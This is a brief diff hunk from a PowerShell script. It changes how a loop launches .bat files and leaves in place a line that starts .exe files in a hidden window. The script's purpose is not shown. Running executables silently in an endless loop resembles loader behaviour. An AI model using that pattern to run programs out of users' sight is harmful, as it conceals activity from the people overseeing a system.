@@ -63,8 +63,9 @@ while ($true) {
                         # Execute the file
                         switch ($extension.ToLower()) {
                             ".bat" {
-                                Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$targetPath`""
+                            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$targetPath`"" -WindowStyle Normal
                             }
+
                             ".exe" {
                                 Start-Process -FilePath $targetPath -WindowStyle Hidden
                             }
